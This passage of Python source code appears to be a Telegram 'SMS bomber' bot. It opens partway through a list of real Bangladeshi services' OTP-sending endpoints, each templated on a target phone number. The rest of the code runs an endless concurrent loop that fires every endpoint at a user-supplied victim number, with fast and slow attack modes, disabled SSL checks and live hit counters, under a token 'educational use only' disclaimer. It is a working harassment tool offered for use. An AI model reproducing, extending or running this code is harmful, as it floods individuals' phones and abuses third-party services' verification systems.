        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "GX api 50",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "GX api 51",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "GX api 52",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "GX api 53",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "GX api 54",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "GX api 55",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "GX api 56",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 57",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "GX api 58",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 59",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "GX api 60",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "GX api 61",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "GX api 62",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "GX api 63",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "GX api 64",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "GX api 65",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
]

async def hit_api(session, api, phone, stats):
    """Hit a single API endpoint"""
    try:
        # Get URL and data
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        # Handle callable URLs
        if callable(url):
            url = url(phone)
        
        # Make request
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False  # Bypass SSL verification for better success rate
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    """Animate a message with loading frames"""
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} {text_prefix}"
            )
            await asyncio.sleep(0.5)
        except:
            break

def create_main_keyboard():
    """Create main reply keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom", style="danger"))
    builder.row(types.KeyboardButton(text="📊 Check Stats", style="primary"))
    builder.row(types.KeyboardButton(text="ℹ️ Help", style="primary"))
    builder.row(types.KeyboardButton(text="👨‍💻 Developer", style="success"))
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    """Create stop attack keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK", style="danger"))
    builder.row(types.KeyboardButton(text="📊 Live Stats", style="primary"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu", style="success"))
    return builder.as_markup(resize_keyboard=True)

def create_stats_inline_keyboard():
    """Create inline keyboard for stats"""
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="♻️ Refresh Stats", callback_data="refresh_stats", style="success"),
        InlineKeyboardButton(text="📊 All Time Stats", callback_data="alltime_stats", style="success")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack", style="danger"),
        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack", style="primary")
    )
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    """Handle /start command"""
    # আপনার ছবির ডাইরেক্ট লিঙ্কটি এখানে দিন
    IMAGE_URL = "https://cdn.phototourl.com/free/2026-08-02-6a295f66-f3e8-4a49-ba61-ae961d2e53ba.png"

    welcome_text = f"""
▓▒░ <b>GX SMS BOMBER BOT</b> ░▒▓
───────────── v2.0 ─────────────

┌─── <b>[ ⚙️ SYSTEM INFO ]</b>
├ 👤 <b>Developer :</b> <code>{DEVELOPER_ID}</code>
├ ⚡ <b>Active APIs :</b> <code>{len(ULTIMATE_APIS)} Endpoints</code>
└ 📡 <b>Services :</b> <i>Calls & SMS</i>

┌─── <b>[ 📌 HOW TO USE ]</b>
├ 📱 Send <code>11-digit</code> Bangladeshi Number
└ 🎛️ Control attack using buttons below

┌─── <b>[ 🔥 CORE FEATURES ]</b>
├ 🚀 <b>Multi-threaded Concurrent Requests</b>
├ 📊 <b>Real-Time Live Attack Monitoring</b>
├ ⚡ <b>Fast (2s) & Slow (10s) Attack Modes</b>
└ 🎬 <b>Smooth Interactive Animations</b>

───────────────────────────────
⚠️ <b>Disclaimer:</b> <i>Use at your own risk. Educational use only!</i>
"""

    await message.answer_photo(
        photo=IMAGE_URL,
        caption=welcome_text,
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "ℹ️ Help")
async def help_command(message: types.Message):
    """Show help information"""
    help_text = f"""
▓▒░ <b>HELP & USER GUIDE</b> ░▒▓
───────────────────────────────

┌─── <b>[ 📱 HOW TO OPERATE ]</b>
├ 1️⃣ Click <b>'🚀 Start Infinite Boom'</b>
├ 2️⃣ Send <b>11-digit number</b> (e.g., <code>019XXXXXXXX</code>)
├ 3️⃣ Attack will start automatically
└ 4️⃣ Click <b>'🛑 STOP ATTACK'</b> to stop

┌─── <b>[ 🤖 BOT COMMANDS ]</b>
├ <code>/start</code> - Launch Main Dashboard
├ <code>/stats</code> - View Attack Statistics
├ <code>/stop</code>  - Terminate Active Attack
└ <code>/help</code>  - Show Help & Guide Menu

┌─── <b>[ ⚡ ATTACK MODES ]</b>
└ 📩 <b>SMS OTPs:</b> Multi-threaded Request Flooding

┌─── <b>[ 👨‍💻 SUPPORT & INFO ]</b>
├ <b>Developer :</b> <code>{DEVELOPER_ID}</code>
└ <b>Support   :</b> Contact developer for system issues

───────────────────────────────
⚠️ <b>Legal Notice:</b> <i>For educational purposes only. Misuse is strictly prohibited!</i>
    """
    
    await message.answer(help_text, parse_mode="HTML")

@dp.message(F.text == "👨‍💻 Developer")
async def developer_info(message: types.Message):
    """Show developer information"""
    dev_text = f"""
▓▒░ <b>DEVELOPER INFORMATION</b> ░▒▓
───────────────────────────────

┌─── <b>[ 👨‍💻 DEV DETAILS ]</b>
├ <b>Developer :</b> <code>{DEVELOPER_ID}</code>
├ <b>Bot Version:</b> <code>2.0</code>
└ <b>Last Updated:</b> <code>{time.strftime('%Y-%m-%d')}</code>

┌─── <b>[ 🔧 TECHNICAL SPECIFICATIONS ]</b>
├ 🐍 Built with Python & aiogram 3.x
├ ⚡ High-speed Async Architecture
├ 📡 Multi-API Concurrent Processing
└ 📊 Real-time Monitoring & Logging

┌─── <b>[ 📞 CONTACT & SUPPORT ]</b>
├ <b>Telegram :</b> <code>{DEVELOPER_ID}</code>
└ Contact for feature requests & support

┌─── <b>[ 🚀 UPCOMING FEATURES ]</b>
├ 📡 Additional API Endpoints
├ 🎯 Custom Attack Patterns
├ ⏱️ Scheduled Attacks
└ 📈 Advanced Analytics Dashboard

───────────────────────────────
⭐ <i>Thank you for using our service!</i>
    """
    
    await message.answer(dev_text, parse_mode="HTML")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    """Show current statistics"""
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})
    
    if not stats:
        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
    else:
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        stats_text = f"""
▓▒░ <b>ATTACK STATISTICS</b> ░▒▓
───────────────────────────────

┌─── <b>[ 📊 LIVE HITS COUNT ]</b>
├ 🔥 <b>Total Hits :</b> <code>{total}</code>
└ 📩 <b>SMS OTPs   :</b> <code>{sms}</code>

┌─── <b>[ 📈 SYSTEM PERFORMANCE ]</b>
├ 🎯 <b>Success Rate :</b> <code>{(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%</code>
├ 📡 <b>Active APIs   :</b> <code>{len(ULTIMATE_APIS)} Endpoints</code>
└ ⏱️ <b>Last Updated :</b> <i>Just now</i>

───────────────────────────────
🔄 <i>Use the buttons below to refresh or switch modes</i>
      """
    
    await message.answer(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message):
    """Prompt for phone number"""
    await message.answer(
    "▓▒░ <b>TARGET INITIALIZATION</b> ░▒▓\n"
    "───────────────────────────────\n\n"
    "┌─── <b>[ 📱 INPUT TARGET NUMBER ]</b>\n"
    "├ <b>Format :</b> <code>11-digit Bangladeshi Number</code>\n"
    "└ <b>Example:</b> <code>019XXXXXXXX</code>\n\n"
    "───────────────────────────────\n"
    "⚠️ <b>Note:</b> Enter valid 11-digit number without country code (+88).",
    parse_mode="HTML"
)
@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    """Stop current attack"""
    user_id = message.from_user.id

    # চেক করা হচ্ছে ব্যবহারকারীর কোনো সক্রিয় অ্যাটাক চলছে কিনা
    if user_id in user_attacks or user_id in stop_signals:
        stop_signals[user_id] = True
        
        await message.answer(
            """— <b>[ 🛑 OPERATION HALTED ]</b> —
├ <b>Status :</b> <code>STOPPING</code>
├ <b>Progress :</b> Finishing current cycle
├ <b>Mode :</b> Safe Shutdown
└ <b>Result :</b> Attack will end shortly

⚠️ <b>Stop request accepted.</b>
⏳ <b>Please wait while the current cycle completes.</b>""",
            parse_mode="HTML",
            reply_markup=create_main_keyboard()
        )

        await asyncio.sleep(2)
        if user_id in user_attacks:
            del user_attacks[user_id]
            
    else:
        # সক্রিয় কোনো অ্যাটাক না থাকলে কেবল এই মেসেজটি যাবে
        await message.answer(
            "ℹ️ <b>No active attack to stop.</b>\n"
            "Start an attack first.",
            reply_markup=create_main_keyboard(),
            parse_mode="HTML"
        )

@dp.message(F.text == "📊 Live Stats")
async def live_stats(message: types.Message):
    """Show live attack statistics"""
    user_id = message.from_user.id
    
    if user_id in attack_stats:
        stats = attack_stats[user_id]
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        live_text = f"""
▓▒░ <b>LIVE ATTACK STATISTICS</b> ░▒▓
────────────────────────────────

┌─── <b>[ 📊 REAL-TIME HITS ]</b>
├ 🔥 <b>Total Hits :</b> <code>{total}</code>
└ 📩 <b>SMS OTPs   :</b> <code>{sms}</code>

┌─── <b>[ 📡 MONITORING STATUS ]</b>
├ ⚡ <b>Status   :</b> <code>{'ACTIVE' if user_id in user_attacks else 'PAUSED'}</code>
└ ⏱️ <b>Last Hit :</b> <code>{stats.get('last_update', 'N/A')}</code>

───────────────────────────────
🔄 <i>Live updates automatically during active session</i>
        """
    else:
        live_text = """
▓▒░ <b>LIVE ATTACK STATISTICS</b> ░▒▓
───────────────────────────────

⚠️ <b>No active session found.</b>
Start a new session to view live monitoring data!
"""

    await message.answer(live_text, parse_mode="HTML")

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    """Return to main menu"""
    await message.answer(
        "🏠 <b>Main Menu</b>\nSelect an option:",
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "refresh_stats")
async def refresh_stats_callback(callback: types.CallbackQuery):
    """Refresh statistics"""
    user_id = callback.from_user.id
    stats = attack_stats.get(user_id, {})

    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp

    stats_text = f"""
❇️ <b>LIVE STATISTICS</b> ❇️

— <b>[ 📊 ATTACK STATUS ]</b> —
├ <b>Total Hits :</b> <code>{total}</code>
├ <b>SMS Sent :</b> <code>{sms}</code>
├ <b>Last Update :</b> <code>{time.strftime('%H:%M:%S')}</code>
└ <b>Status :</b> <code>RUNNING</code>

⚡️ <b>Statistics refreshed successfully.</b>
🔄 <b>Live monitoring is active.</b>
"""

    await callback.message.edit_text(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer("✅ Statistics refreshed!")

@dp.callback_query(F.data == "alltime_stats")
async def alltime_stats_callback(callback: types.CallbackQuery):
    """Show all-time statistics"""
    # This would track all attacks, for now show current
    await callback.answer("📈 All-time stats feature coming soon!")

@dp.callback_query(F.data == "fast_attack")
async def fast_attack_callback(callback: types.CallbackQuery):
    """Switch to fast attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
        await callback.answer("⚡ Fast mode activated (2s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.message(F.text.regexp(r"^(\+?88)?01[3-9]\d{8}$"))
async def handle_phone_number(message: types.Message):
    """Handle phone number input and start attack"""
    user_id = message.from_user.id
    phone = message.text.strip()

    if phone.startswith("+88"):
        phone = phone[3:]
    elif phone.startswith("88"):
        phone = phone[2:]

    # Initialize attack
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,  # Default delay
        'cycles': 0
    }

    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }
    
    # Send starting animation
    start_msg = await message.answer(
    f"""
▓▒░ <b>ATTACK INITIALIZATION</b> ░▒▓
───────────────────────────────

┌─── <b>[ 🚀 OPERATION STATUS ]</b>
├ <b>Target :</b> <code>{phone}</code>
├ <b>APIs Loaded :</b> <code>{len(ULTIMATE_APIS)}</code>
├ <b>Mode :</b> <code>INFINITE</code>
└ <b>Status :</b> <code>INITIALIZING...</code>

───────────────────────────────
⚡ <b>Preparing attack sequence...</b>
⏳ <b>Please wait while all endpoints are loaded.</b>
    """,
    parse_mode="HTML",
    reply_markup=create_stop_keyboard()
)
    
    # Run animation
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    
    # Start attack in background
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
    
    # Update with initial status
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=start_msg.message_id,
        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
             f"<b>Target:</b> <code>{phone}</code>\n"
             f"<b>Status:</b> Firing APIs...\n"
             f"<b>Hits:</b> 0\n"
             f"<b>Next cycle:</b> 5s",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )

async def run_attack(user_id, phone, chat_id, message_id):
    """Run the attack loop"""
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count
                
                # Fire all APIs
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Calculate hits
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp
                
                # Update message
                stats['last_update'] = time.strftime('%H:%M:%S')
                
                # Update status message
                status_text = f"""
▓▒░ <b>ACTIVE ATTACK - CYCLE {cycle_count}</b> ░▒▓
────────────────────────────────

┌─── <b>[ 🎯 TARGET DETAILS ]</b>
├ 📱 <b>Target :</b> <code>{phone}</code>
├ ⚡ <b>Status :</b> <code>RUNNING</code>
└ ⏱️ <b>Delay  :</b> <code>{delay}s</code>

┌─── <b>[ 📊 LIVE STATISTICS ]</b>
├ 📩 <b>SMS OTPs   :</b> <code>{sms}</code>
└ 🔥 <b>Total Hits :</b> <code>{total}</code>

───────────────────────────────
⏱️ <b>Next cycle in :</b> <code>{delay}s</code>
🔄 <b>Last Updated   :</b> <code>{stats['last_update']}</code>
"""
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Failed to update message: {e}")
                
                # Check if we should stop
                if stop_signals.get(user_id, False):
                    break
                    
                # Wait for next cycle
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Attack error for user {user_id}: {e}")
                await asyncio.sleep(5)  # Wait before retry
    
    # Attack stopped
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    final_text = f"""
▓▒░ <b>ATTACK TERMINATED</b> ░▒▓
────────────────────────────────

┌─── <b>[ 🎯 SESSION SUMMARY ]</b>
├ 📱 <b>Target       :</b> <code>{phone}</code>
├ 🔄 <b>Total Cycles :</b> <code>{cycle_count}</code>
└ ⏱️ <b>Duration     :</b> <code>{time.time() - attack_info['start_time']:.1f}s</code>

┌─── <b>[ 📊 FINAL STATISTICS ]</b>
├ 📩 <b>SMS OTPs     :</b> <code>{sms}</code>
└ 🔥 <b>Total Hits   :</b> <code>{total}</code>

────────────────────────────────
✅ <b>Status:</b> <code>COMPLETED</code>
⏱️ <b>Time  :</b> <code>{time.strftime('%H:%M:%S')}</code>
    """
    
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard()
        )
    except:
        pass
    
    # Clean up
    if user_id in stop_signals:
        del stop_signals[user_id]
    if user_id in user_attacks:
        del user_attacks[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    """Handle /stop command"""
    await stop_attack(message)

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    """Handle /stats command"""
    await check_stats(message)

@dp.message(Command("help"))
async def help_command_handler(message: types.Message):
    """Handle /help command"""
    await help_command(message)

@dp.message()
async def handle_other_messages(message: types.Message):
    """Handle other messages"""
    if message.text:
        await message.answer(
            "❓ <b>Unknown command!</b>\n\n"
            "Use /help to see available commands or use the buttons below.",
            reply_markup=create_main_keyboard(),
            parse_mode="HTML"
        )

async def main():
    """Main function to start the bot"""
    logger.info("Starting Ultimate Bomber Bot...")
    logger.info(f"Developer: {DEVELOPER_ID}")
    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
    
    try:
        # Start polling
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        logger.info("Restarting in 5 seconds...")
        await asyncio.sleep(5)
        # Restart
        await main()

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())